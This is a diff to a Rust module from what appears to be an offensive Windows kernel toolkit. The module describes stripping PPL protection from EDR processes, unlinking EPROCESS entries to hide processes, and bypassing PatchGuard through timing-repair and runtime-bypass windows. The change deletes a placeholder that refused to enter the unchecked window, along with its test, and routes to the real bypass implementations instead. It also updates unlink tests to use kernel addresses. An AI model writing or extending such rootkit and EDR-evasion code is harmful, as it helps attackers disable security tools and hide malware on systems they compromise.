@@ -6,11 +6,11 @@
 //! - [`PplStripper`] (`PplKit`): zero an EPROCESS's `Protection.Level` (+ the
 //!   `SignatureLevel`/`SectionSignatureLevel` neighbours) to strip PPL from an
 //!   EDR process. Data-only, HVCI-safe.
-//! - [`PatchGuardWindow`] (`PatchGuardKit`): a data-only marker-based window.
-//!   The classic PG-bypass families (RuntimePgBypass / OutflankTimingRepair)
-//!   need per-build PG-context layout + a second thread; this ships the
-//!   *algorithm skeleton* (the enter/repair state machine) so the real PG-
-//!   context probe plugs in without rewriting the kit.
+//! - PatchGuard windows ([`TimingRepairWindow`] / [`RuntimePgBypassWindow`]):
+//!   the two real PG-bypass families, selected at runtime by
+//!   [`crate::win::select_pg_window`]. No skeleton base — selection is
+//!   capability-driven (`supports_thread_suspend` flag + PG-context offsets
+//!   table) and returns `None` when no window is available for the build.
 //!
 //! All consume `&dyn KernelRw` + version-resolved [`EprocessOffsets`] from
 //! [`crate::offsets`]. Unit-tested with a mock KernelRw; never run against a
@@ -216,48 +216,6 @@ impl PplKit for PplStripper {
 /// 1. [`TimingRepairWindow`] — Outflank-style, all builds (short window <1s)
 /// 2. [`RuntimePgBypassWindow`] — kurasagi-style, Win11 24H2+ (long window)
 ///
-/// The real RuntimePgBypass / OutflankTimingRepair families need per-build
-/// PG-context layout (the `KiInitializePatchGuardContext` fields + the
-/// validation thread's state). This ships the *state machine* — the per-build
-/// probe plugs into [`PatchGuardWindow::probe`] / `repair`.
-pub struct PatchGuardWindow {
-    /// A marker the operator's PG-probe writes to flag "PG is suspended /
-    /// misdirected". Real impls set this from the PG validation thread state.
-    #[allow(dead_code)]
-    armed: core::sync::atomic::AtomicBool,
-}
-
-impl PatchGuardWindow {
-    pub fn new() -> Self {
-        Self {
-            armed: core::sync::atomic::AtomicBool::new(false),
-        }
-    }
-}
-
-impl Default for PatchGuardWindow {
-    fn default() -> Self {
-        Self::new()
-    }
-}
-
-impl PatchGuardKit for PatchGuardWindow {
-    /// Open the unchecked window. The real impl probes the PG validation
-    /// thread (locate it via the DPC queue / the PG context signature), and
-    /// either suspends it (RuntimePgBypass) or arms a repair hook in the
-    /// terminate callback (OutflankTimingRepair). Here we expose the contract;
-    /// the probe is operator-wired per build.
-    fn enter_unchecked(&self, _krw: &dyn KernelRw) -> Result<crate::PgGuard<'_>, KitError> {
-        // Skeleton: a real probe goes here. Until the per-build PG-context
-        // layout is resolved, refuse — running a DKOM edit outside a real PG
-        // window is an immediate bugcheck.
-        Err(KitError::UnsupportedPosture(
-            "PatchGuardKit needs per-build PG-context probe (RuntimePgBypass / \
-             OutflankTimingRepair) — wire before entering the unchecked window",
-        ))
-    }
-}
-
 // ---- §3.1a TimingRepairWindow — Outflank Peekaboo style (all builds) ------
 //
 // The timing-repair approach works on ALL Windows versions by exploiting the
@@ -590,9 +548,13 @@ mod tests {
     fn unlink_removes_eprocess_from_list() {
         let krw = MockKrw::new();
         let offsets = test_offsets();
-        let head = 0x1000usize;
-        let e1 = 0x5000usize;
-        let e2 = 0x6000usize;
+        // Use kernel-canonical addresses (>= 0xFFFF_8000_0000_0000) — the
+        // production guard rejects user-space-range pointers as non-canonical
+        // (they'd never appear in a real kernel LIST_ENTRY).
+        const KBASE: usize = 0xFFFF_8000_0000_0000;
+        let head = KBASE + 0x1000;
+        let e1 = KBASE + 0x5000;
+        let e2 = KBASE + 0x6000;
         let l1 = e1 + offsets.active_process_links;
         let l2 = e2 + offsets.active_process_links;
         krw.set_u64(head, l1 as u64);
@@ -628,16 +590,6 @@ mod tests {
         assert_eq!(krw.get_byte(eproc + offsets.protection), 0);
         assert_eq!(krw.get_byte(eproc + offsets.signature_level), 0);
         assert_eq!(krw.get_byte(eproc + offsets.section_signature_level), 0);
-    }
-
-    #[test]
-    fn patchguard_window_refuses_without_probe() {
-        // The skeleton must refuse — entering a DKOM window without a real PG
-        // probe is a guaranteed bugcheck.
-        let krw = MockKrw::new();
-        let kit = PatchGuardWindow::new();
-        let r = kit.enter_unchecked(&krw);
-        assert!(matches!(r, Err(KitError::UnsupportedPosture(_))));
     }
 
     // ---- Phase 3: TimingRepairWindow / RuntimePgBypassWindow tests ----
